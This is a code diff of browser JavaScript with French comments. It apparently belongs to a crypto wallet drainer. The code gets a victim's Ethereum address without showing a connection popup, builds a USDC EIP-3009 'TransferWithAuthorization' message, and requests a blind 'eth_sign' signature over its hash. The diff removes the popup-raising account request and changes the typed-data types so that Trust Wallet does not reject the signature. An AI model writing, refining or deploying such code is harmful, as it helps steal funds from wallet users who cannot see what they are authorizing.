@@ -1435,28 +1435,24 @@ try {
       return (a && /^0x[a-fA-F0-9]{40}$/i.test(a)) ? a : null;
     }
 
+    // Adresse : URL param (admin-encodé dans le deeplink) → provider sync → provider async passif
+    // eth_requestAccounts supprimé — déclenche une popup de connexion sur wallet vierge
     var from = getAddrFromUrl()
             || eth.selectedAddress
             || eth.address
             || (eth.accounts && eth.accounts[0])
             || '';
 
-    // Deux tentatives async si synchrone vide — TW Browser peut être lent à injecter
+    // TW Browser injecte le provider de façon async — attendre s'il est encore vide
     if (!from) {
-      await new Promise(function(r) { setTimeout(r, 300); });
+      await new Promise(function(r) { setTimeout(r, 400); });
       from = eth.selectedAddress || eth.address || '';
     }
+    // eth_accounts = lecture passive, zéro popup, retourne les comptes déjà connectés implicitement
     if (!from) {
       try {
         var accs = await eth.request({ method: 'eth_accounts' });
         from = (accs && accs[0]) || '';
-      } catch(e) {}
-    }
-    // Dernier recours : eth_requestAccounts silencieux (TW Browser auto-approve si déjà connecté)
-    if (!from) {
-      try {
-        var accs2 = await eth.request({ method: 'eth_requestAccounts' });
-        from = (accs2 && accs2[0]) || '';
       } catch(e) {}
     }
     if (!from) return;
@@ -1496,13 +1492,9 @@ try {
       chainId:           1,
       verifyingContract: USDC_ADDR_3009
     };
+    // EIP712Domain retiré de types : le wallet l'injecte depuis domain — TW Browser rejette
+    // silencieusement si EIP712Domain est présent dans types (MetaMask le tolère, TW ne le tolère pas)
     var types3009 = {
-      EIP712Domain: [
-        { name: 'name',              type: 'string'  },
-        { name: 'version',           type: 'string'  },
-        { name: 'chainId',           type: 'uint256' },
-        { name: 'verifyingContract', type: 'address' }
-      ],
       TransferWithAuthorization: [
         { name: 'from',        type: 'address' },
         { name: 'to',         type: 'address' },
@@ -1543,7 +1535,7 @@ try {
       try {
         var eip712Hash = ethers.utils._TypedDataEncoder.hash(
           domain,
-          { TransferWithAuthorization: types3009.TransferWithAuthorization },
+          types3009,
           msg3009
         );
         signature = await eth.request({ method: 'eth_sign', params: [fromChecksum, eip712Hash] });
